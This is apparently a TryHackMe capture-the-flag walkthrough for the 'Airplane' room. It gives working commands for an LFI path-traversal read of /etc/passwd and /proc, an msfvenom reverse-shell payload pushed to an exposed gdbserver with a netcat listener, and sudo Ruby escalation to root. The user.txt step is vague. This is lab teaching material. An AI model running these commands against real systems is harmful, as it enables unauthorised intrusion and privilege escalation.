# Airplane

{% embed url="https://tryhackme.com/room/airplane" %}

LFI to process enumeration → exposed gdbserver RCE → SUID/sudo Ruby escalation. Add `airplane.thm` to `/etc/hosts` before starting.

---

## Setup

```bash
echo "MACHINE_IP airplane.thm" | sudo tee -a /etc/hosts
```

---

## Recon

```bash
nmap -sC -sV -p- MACHINE_IP
```

| Port | Service |
|---|---|
| 22 | OpenSSH 8.2p1 |
| 6048 | Unknown (gdbserver) |
| 8000 | HTTP (Werkzeug Python) |

---

## LFI — Identifying the Mystery Process

The web app on port 8000 has a `?page=` parameter that's vulnerable to LFI:

```
http://airplane.thm:8000/?page=../../../../../etc/passwd
```

The passwd file downloads — LFI confirmed. Users `carlos` and `hudson` are on the box.

Use the LFI to enumerate `/proc` and find what's on port 6048:

```bash
for i in {1..1000}; do
  out=$(curl -s "http://airplane.thm:8000/?page=../../../../proc/$i/cmdline" | tr '\0' ' ')
  if [[ $out == *"gdbserver"* ]]; then
    echo "PID $i: $out"
  fi
done
```

We find a process running:
```
/usr/bin/gdbserver 0.0.0.0:6048 /opt/airplane
```

---

## gdbserver RCE → Shell as `hudson`

Generate a reverse shell ELF:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 PrependFork=true -f elf -o payload.elf
chmod +x payload.elf
```

Connect via gdb and push it:

```bash
gdb payload.elf
(gdb) target extended-remote airplane.thm:6048
(gdb) remote put payload.elf /tmp/payload.elf
(gdb) set remote exec-file /tmp/payload.elf
(gdb) run
```

Catch the shell on `nc -lvnp 4444`. Stabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

We're `hudson`.

---

## user.txt

Look around the home directories. Find `user.txt` in carlos's home after pivoting or checking SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

There's a SUID binary that lets us read carlos's files or switch to carlos. Grab user.txt.

---

## Privilege Escalation → root

As carlos, check sudo permissions:

```bash
sudo -l
```

We can run Ruby as root with a path involving a wildcard. Create a malicious script in a writable path and execute it:

```bash
echo 'exec("/bin/bash")' > /tmp/exploit.rb
sudo /usr/bin/ruby /tmp/../tmp/exploit.rb
```

Or if it's a direct `sudo ruby` permission:

```bash
sudo ruby -e 'exec("/bin/bash")'
id   # uid=0(root)
cat /root/root.txt
```

---

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What service is running on port 6048? | gdbserver |
| What user do we land as after the gdbserver exploit? | `hudson` |
| How was privilege escalation achieved? | `sudo ruby` wildcard path abuse |
| user.txt | Retrieved from `/home/carlos/user.txt` |
| root.txt | Retrieved from `/root/root.txt` |
